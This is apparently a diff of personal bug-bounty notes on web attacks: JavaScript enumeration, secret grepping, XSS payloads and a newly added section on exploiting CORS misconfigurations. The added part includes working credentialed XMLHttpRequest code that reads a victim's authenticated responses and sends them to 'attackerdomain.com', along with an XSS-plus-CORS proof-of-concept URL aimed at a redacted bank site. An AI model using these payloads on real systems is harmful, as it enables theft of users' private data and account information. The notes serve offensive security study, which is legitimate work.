@@ -338,7 +338,7 @@ Check robots.txt page
 
  
  Javascript Enumeration
- burpsuite -> sitemap -> enagement-> find scritps -> export options-> save scripts
+ burpsuite -> sitemap -> enagement-> find scritps -> export options-> save scripts   //burp pro
   
 cat domains.txt | waybackurls > urls.txt           or     cat domains.txt | waybackurls > ~/Desktop/urls.txt
  
@@ -346,8 +346,7 @@ cat domains.txt | waybackurls > urls.txt           or     cat domains.txt | wayb
  
  Now that we have a readable version of all the JavaScript code in one place, I like to start with Grep to get a feel of what I am expecting. The general command is grep --color -i term outfile.txt. You just change the word term with what you’re looking for. For example, try words like secret, admin, password or token to find hardcoded secrets. Alternatively, you can use a path prefix to look for endpoints. Say you noticed that all API endpoints start with /api/v1. In this case, you can substitute the word term in the grep command with /api/v1 to collect all the API endpoints.
  
-
-
+ 
  
  onliner to extract endpoints from JS files of a given host
  ./js at my kali/scan/
@@ -360,12 +359,18 @@ content discovery/params discovery  for bug hunting
 
 check for  python3 SecretFinder.py
 
+
+ waybackurls target.com | grep "\\.js"|uniq|sort
  waybackurls target.com | grep "\\.js" | xargs -n1 -I@ curl -k @ | tee -a content.txt        //give me output
                                        $ cat hosts.txt | gau | subjs                     // no output   check later
 
 gau $mytarget|egrep -iv '\.json'|grep -iE '\.js'|antiburl|awk '{print $4}' | xargs -I %% bash -c 'python3 SecretFinder.py -i %% -o cli -r "$anything"'  // no output, checkmagain later
 
 keywords to look for  in javascript files:pathname url:, POST, api, GET, setRequestHeader, send( (yes with just one (, as it's used when making Ajax requests!. .headers, onreadystatechange, var {xyz} = , getParameter(), parameter, .theirdomain.com, apiKey. and also postMessage, messageListener, .innerHTML, document.write(, document.cookie, location.href, redirectUrl, window.hash.
+
+
+ getting javasacript files
+ source code/developers tools -> search for .js , then copy and paste in vscode and search for all ** word 
  
 
 
@@ -387,6 +392,9 @@ Now you need to check if company has the page or not , if no then register as th
 
 
 Xss
+check for xss cheatsheat
+
+
 REFLECTED
 1)
 Use Gau or Wayback urls to passively gather urls of the target.
@@ -630,6 +638,8 @@ test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
       
 
 url encoding of payload 
+
+
 `%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E`    
 
 Hex encoding of payload
@@ -676,7 +686,7 @@ www.gap.com/email?message=<script>alert("hi")</script>
 
      
      Tips to find DOM XSS: ⚡️🔥
-
+ never use source while testing for dom xss
 1. Start Burpsuite Community Edition 
 2. Click on Open Browser 
 3. Go and click on the Burp icon in extension tab on browser 
@@ -689,10 +699,21 @@ www.gap.com/email?message=<script>alert("hi")</script>
 10. Click it to get Dom XSS poc 
 11. If doesn’t work, repeat the same on different url, functionality. 
 
+/////////
+ if string enters in double qoute, we might break out by using double qoute
+ REMEMBER
+ if you data get url- encoded before being processed, it is unlikely an xss will work
+
+   
+
+
 ///
 eval(alert(document.domain))
 location.hash       https://oldnavy.gap.com/#test          change the string ? to # if empty
-location.search
+location.search   .... place a random value into it
+  example
+  https://www.gogle.com/submit.thml?email=sdddhhhd
+  it would return ?email=sdddhhhd
 
 window.location.hash.slice(1)
 
@@ -873,8 +894,165 @@ cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|p
    https://github.com/projectdiscovery/httpx
   
   
+  TIP
+  ALWYS CHECK IF THE WEBSITES ALWSY TRUST ANT SUBDOMAIN THROW AT IT, IF YES , FIND THE XSS ON THE SUBDOMAIN  or any subdomain it trustes    //CHECK FOR GUIDANCE AT https://danielantonsen.com/abusing-cors-improper-origin-validation/
+  
+  examples
+  function cors() {  
+var xhttp = new XMLHttpRequest();  
+xhttp.onreadystatechange = function() {    
+    if (this.status == 200) {    
+    alert(this.responseText);     
+    document.getElementById("demo").innerHTML = this.responseText;    
+    }  
+};  
+xhttp.open("GET", "https://www.redacted.com/api/return", true);  
+xhttp.withCredentials = true;  
+xhttp.send();
+}
+cors();
+   
+   POCS
+    https://banques.redacted.com/choice-quiz?form_banque="><script>function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200) alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","https://www.redacted.com/api/return",true);xhttp.withCredentials=true;xhttp.send()}cors();</script>&form_cartes=73&iframestat=1
   
   
+  
+  tip
+  💡
+  A server may (at times) respond with CORS headers ONLY if the Origin header is set in the request. If this Origin header is not there already then try adding it.
+  
+  GET
+  var xhr = new XMLHttpRequest(); 
+xhr.onload = reqListener; 
+xhr.open('GET','https://target.example.com/endpoint/',true); 
+xhr.withCredentials = true;
+xhr.send();
+
+// leak json response to attacker domain
+function reqListener() {
+    location='https://attackerdomain.com/?response='+this.responseText; 
+};
+  POST
+  var postdata = "fname=Henry&lname=Ford"
+
+var xhr = new XMLHttpRequest(); 
+xhr.onload = reqListener; 
+xhr.open("POST", 'https://target.example.com/endpoint/', true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.withCredentials = true;
+xhr.send(postdata);
+
+// leak json response to attacker domain
+function reqListener() {
+    location='https://attackerdomain.com/?response='+this.responseText; 
+};
+  
+  
+  
+   \\HOW TO IDENTIFY A WEBSITE THAT IS VUNERABLE TO CORS MISCONIFIGATION  //
+ 1)CHECK RESPONSE HEADERS: 
+ Examine the HTTP response headers of the website. Look for the presence of CORS-related headers. 
+  
+  \\ KEY HEADER TO CHECK //
+Access-Control-Allow-Origin: This header specifies which origins are permitted to access the resources on the website. If it is set to a wildcard (*) or is too permissive, it can indicate a vulnerability. no browers acceo]pt using only wild card *
+    NOTE ON THIS
+   When responding to a credentialed request,  server must specify a domain, and cannot use wild carding
+In other words, using a wildcard effectively disables the Allow-Credentials header.
+
+As a result of these limitations, many servers programmatically generate the Access-Control-Allow-Origin header based on the user-supplied Origin value. This is the single most common CORS vulnerability. If you see a HTTP response with any Access-Control-* headers but no origins declared, this is a strong indication that the server will generate the header based on your input. Other servers will only send CORS headers if they receive a request containing the Origin header, making associated vulnerabilities extremely easy to miss.
+
+
+
+
+Access-Control-Allow-Methods: This header defines which HTTP methods (e.g., GET, POST) are allowed in cross-origin requests.
+Access-Control-Allow-Headers: This header specifies the HTTP headers that can be used in the actual request.
+Access-Control-Allow-Credentials: If this is set to true, it means that the website allows credentials (e.g., cookies) to be included in cross-origin requests. This should be used cautiously.
+
+
+   the following table summarizes the exploitability based on the CORS configuration:
+   
+   acces control-Allow-Origin” value          Access-Control-Allow-Credentials” value                 Exploitable
+   https://attacker.com                                true                                                     yes
+     null                                                true                                                  yes
+     *                                                  true                                                    no
+  
+
+ \\ USING CURLS WHEN TESTIN FOR CORS //
+  curl -X GET https://example.com
+  
+  curl -X GET -I https://example.com
+  curl -X GET -H "Origin: https://otherdomain.com" https://example.com
+  
+  curl -X GET -I -H "Origin: https://otherdomain.com" https://example.com
+   curl -X POST -I https://example.com
+
+  curl -X POST -I https://example.com
+  curl -X POST -I -H "Origin: https://otherdomain.com" https://example.com
+  
+  curl -X PUT -I https://example.com
+  curl -X PUT -I -H "Origin: https://otherdomain.com" https://example.com
+
+  curl -X DELETE -I -H "Origin: https://otherdomain.com" https://example.com
+  curl -X DELETE -I https://example.com
+
+  curl -X OPTIONS -I -H "Access-Control-Request-Method: POST" -H "Origin: https://otherdomain.com" https://example.com           //This command tests how the website handles cross-origin 
+                                                                                                                                  requests with credentials (e.g., cookies). Replace
+                                                                                                                                   "YOUR_SESSION_COOKIE" with a valid session cookie. //
+
+curl https://my.target.com/api/web/user -H "Origin: https://geekboy.ninja" -I 
+
+
+  
+    STEP BY STEP USING THE DEVELOPER BROWERS TOOL
+    
+    OPEN THE browers and go to the website , go to the developer tool when right click 
+    check on the netwrok tab/ console
+    
+    go to different website and copy its url , open the developer tools and 
+    type a command to make a request to the first website (the testing websites)
+    OBSERVE THE RESULT
+    
+   After you send the request, check what happens in the developer tools. If everything is set up correctly (good CORS), the request might be blocked, and you'll see an error message. 
+ 
+   But if the request goes through without any problems (bad CORS), 
+
+    always Repeat and Experiment:
+
+  Try different websites and different types of requests (GET, PUT, PATCH, POST, DELETE,OPTION AND HEAD ).
+  
+
+    Javascript Script For Testing Cors
+    
+    // Replace these with your target website and the origin you want to test.
+const targetURL = 'https://example.com';
+const customOrigin = 'https://attacker.com';
+
+// Create a fetch request with a custom origin header.
+fetch(targetURL, {
+  method: 'GET', // You can use different methods like POST, PUT, DELETE, etc.
+  headers: {
+    'Origin': customOrigin,
+  },
+})
+  .then(response => {
+    console.log('Response status:', response.status);
+    // Check if the response headers indicate that the request was allowed.
+    if (response.headers.get('Access-Control-Allow-Origin') === customOrigin) {
+      console.log('CORS is potentially misconfigured.');
+    } else {
+      console.log('CORS is properly configured.');
+    }
+  })
+  .catch(error => {
+    console.error('Error:', error);
+  });
+
+  
+  
+
+
+
+
   
   
   
